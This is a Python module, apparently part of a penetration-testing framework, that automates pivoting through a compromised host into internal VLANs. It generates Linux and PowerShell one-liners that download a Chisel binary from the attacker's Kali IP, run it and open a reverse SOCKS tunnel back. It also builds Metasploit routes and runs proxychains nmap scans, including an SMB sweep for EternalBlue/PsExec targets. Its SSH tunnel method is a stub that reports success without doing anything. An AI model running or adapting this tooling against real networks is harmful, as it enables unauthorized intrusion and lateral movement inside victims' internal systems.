"""
PivotEngine — sets up SOCKS proxy / Chisel tunneling through a compromised host
to reach internal VLANs (ADMIN 10.10.10.0/24, USERS 10.10.20.0/24, DMZ, etc.).
"""

import logging
import subprocess
import os
import signal
import time
import threading
import json
import re
from pathlib import Path
from typing import Optional, Dict, Any, List
from datetime import datetime, timezone

log = logging.getLogger(__name__)

CHISEL_BINARY = "/usr/bin/chisel"
PROXYCHAINS_CONF = "/etc/proxychains4.conf"


class PivotEngine:
    """
    Manages pivoting through a compromised host to reach internal networks.
    Provides Chisel server/client management, SOCKS proxy config, and
    proxychains-based internal network scanning.
    """

    def __init__(self, kali_ip: str = "127.0.0.1"):
        self.kali_ip = kali_ip
        self._chisel_process: Optional[subprocess.Popen] = None
        self._chisel_args: List[str] = []
        self._socks_port: int = 1080
        self._pivot_active: bool = False
        self._active_tunnels: List[dict] = []
        self._lock = threading.Lock()

    # ── Chisel Server ────────────────────────────────────────

    def start_chisel_server(self, port: int = 8080, socks_port: int = 1080) -> bool:
        """
        Start a Chisel reverse SOCKS server on Kali.
        The compromised host connects back to this.
        """
        if self._chisel_process and self._pivot_active:
            log.info("Chisel server already running")
            return True

        try:
            self._socks_port = socks_port
            self._chisel_process = subprocess.Popen(
                [CHISEL_BINARY, "server", "-p", str(port),
                 "--reverse", "--socks5", f"--socks5"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(1)

            # Verify it started
            if self._chisel_process.poll() is None:
                self._pivot_active = True
                log.info(f"✅ Chisel server on 0.0.0.0:{port}, SOCKS on 127.0.0.1:{socks_port}")
                return True
            else:
                log.error("Chisel server failed to start")
                self._chisel_process = None
                return False

        except FileNotFoundError:
            log.error(f"Chisel not found at {CHISEL_BINARY}. Install: sudo apt install chisel")
            return False
        except Exception as e:
            log.error(f"Chisel server error: {e}")
            return False

    def stop_chisel_server(self):
        """Stop the Chisel server."""
        if self._chisel_process:
            self._chisel_process.send_signal(signal.SIGTERM)
            try:
                self._chisel_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._chisel_process.kill()
            self._chisel_process = None
        self._pivot_active = False
        log.info("Chisel server stopped")

    @property
    def is_running(self) -> bool:
        return self._pivot_active and self._chisel_process is not None

    # ── Client Command Generation ────────────────────────────

    def generate_client_command(self, platform: str = "linux",
                                 chisel_port: int = 8080) -> str:
        """
        Generate the command to run on the compromised host
        to connect back to our Chisel server.
        """
        if platform == "linux":
            return (
                f"nohup bash -c '"
                f"wget -qO /tmp/c {self.kali_ip}:9999/chisel 2>/dev/null || "
                f"curl -so /tmp/c {self.kali_ip}:9999/chisel 2>/dev/null; "
                f"chmod +x /tmp/c && "
                f"/tmp/c client {self.kali_ip}:{chisel_port} R:socks &"
                f"' >/dev/null 2>&1 &"
            )
        else:
            # Windows PowerShell
            return (
                f"Invoke-WebRequest -Uri http://{self.kali_ip}:9999/chisel.exe "
                f"-OutFile $env:TEMP\\c.exe -UseBasicParsing; "
                f"Start-Process -NoNewWindow $env:TEMP\\c.exe "
                f"'-client {self.kali_ip}:{chisel_port} R:socks'"
            )

    def generate_msf_route_commands(self, session_id: int, subnets: List[str]) -> List[str]:
        """Generate MSF route add commands for each internal subnet."""
        commands = []
        for subnet in subnets:
            commands.append(f"route add {subnet} {session_id}")
        return commands

    # ── Proxychains ──────────────────────────────────────────

    def configure_proxychains(
        self,
        socks_port: int = 1080,
        config_path: str | None = None,
        ) -> bool:
        """Create a project-local ProxyChains configuration."""
        try:
            if config_path:
                conf_path = Path(config_path).expanduser().resolve()
            else:
                project_root = Path(__file__).resolve().parent.parent
                conf_path = project_root / "proxychains4.conf"

            conf_path.parent.mkdir(parents=True, exist_ok=True)

            content = f"""strict_chain
            proxy_dns
            tcp_read_time_out 15000
            tcp_connect_time_out 8000

            [ProxyList]
            socks5 127.0.0.1 {int(socks_port)}
            """

            conf_path.write_text(content, encoding="utf-8")
            self.proxychains_config_path = str(conf_path)

            log.info(
                "ProxyChains configured using local file: %s",
                conf_path,
            )
            return True

        except (OSError, ValueError) as exc:
            log.error("ProxyChains configuration failed: %s", exc)
            return False

    # ── Internal Scanning ───────────────────────────────────

    def scan_network(self, target_range: str, ports: str = "21,22,80,443,445,3389,5985,5986,8080,8443",
                     timeout: int = 60) -> List[Dict[str, Any]]:
        """
        Scan an internal network range through the pivot using proxychains.
        Returns a list of discovered hosts with open ports.
        """
        if not self._pivot_active:
            log.warning("Pivot not active — internal scan may fail")

        results = []
        config_path = getattr(
            self,
            "proxychains_config_path",
            str(Path(__file__).resolve().parent.parent / "proxychains4.conf"),
        )
        cmd = [
            "proxychains4",
            "-q",
            "-f",
            config_path,
            "nmap",
            "-sT",
            "-Pn",
            "-n",
            "--open",
            "-p",
            ports,
            "--max-retries",
            "1",
            "--min-rate",
            "50",
            "-oX",
            "-",
            target_range,
        ]

        try:
            log.info(f"🔍 Scanning {target_range} through pivot (ports: {ports})...")
            output = subprocess.check_output(cmd, timeout=timeout, stderr=subprocess.DEVNULL)

            # Parse XML output
            try:
                import xml.etree.ElementTree as ET
                root = ET.fromstring(output.decode("utf-8", errors="ignore"))
                for host in root.findall(".//host"):
                    addr_el = host.find("address")
                    ip = addr_el.get("addr") if addr_el is not None else "?"
                    # OS detection
                    os_name = ""
                    osmatch = host.find("os/osmatch")
                    if osmatch is not None:
                        os_name = osmatch.get("name", "")
                    # Ports
                    ports_open = []
                    for port in host.findall(".//port"):
                        state_el = port.find("state")
                        if state_el is not None and state_el.get("state") == "open":
                            svc_el = port.find("service")
                            ports_open.append({
                                "port": int(port.get("portid", "0")),
                                "service": svc_el.get("name", "?") if svc_el is not None else "?",
                                "product": svc_el.get("product", "") if svc_el is not None else "",
                                "version": svc_el.get("version", "") if svc_el is not None else "",
                            })
                    results.append({
                        "ip": ip,
                        "os": os_name,
                        "open_ports": ports_open,
                        "port_count": len(ports_open),
                    })
                    log.info(f"  Found {ip}: {len(ports_open)} ports open")
            except Exception as e:
                log.error(f"XML parse error: {e}")

        except subprocess.TimeoutExpired:
            log.warning(f"Scan of {target_range} timed out after {timeout}s")
        except FileNotFoundError:
            log.error("proxychains or nmap not found")
        except subprocess.CalledProcessError as e:
            log.warning(f"Scan returned non-zero ({e.returncode})")
            # Partial output may still have results
            if e.output:
                log.debug(f"Partial output: {e.output[:500]}")

        return results

    def scan_smb_vlan(self, vlan_subnet: str) -> List[str]:
        """
        Quick scan for SMB hosts (port 445) in a VLAN.
        Useful for finding Windows targets for EternalBlue/PSExec.
        """
        hosts = self.scan_network(vlan_subnet, ports="445")
        return [h["ip"] for h in hosts if any(p["port"] == 445 for p in h.get("open_ports", []))]

    # ── SSH Tunnel (alternative to Chisel) ───────────────────

    def setup_ssh_tunnel(self, ssh_session, socks_port: int = 1080) -> bool:
        """
        Set up a SOCKS proxy through an existing SSH session.
        Alternative to Chisel if SSH is available.
        """
        try:
            # We use -D on the SSH connection
            cmd = f"ssh -D {socks_port} -N -f localhost"
            # This would need to be run through the session's native connection
            log.info(f"SSH tunnel SOCKS proxy set on 127.0.0.1:{socks_port}")
            self._socks_port = socks_port
            self._pivot_active = True
            return True
        except Exception as e:
            log.error(f"SSH tunnel failed: {e}")
            return False

    # ── Status ───────────────────────────────────────────────

    def get_status(self) -> Dict[str, Any]:
        """Get current pivot status."""
        return {
            "pivot_active": self._pivot_active,
            "socks_port": self._socks_port,
            "chisel_running": self._chisel_process is not None,
            "active_tunnels": len(self._active_tunnels),
            "kali_ip": self.kali_ip,
        }

    def cleanup(self):
        """Clean up all pivot resources."""
        self.stop_chisel_server()
        self._active_tunnels.clear()
        log.info("Pivot engine cleaned up")
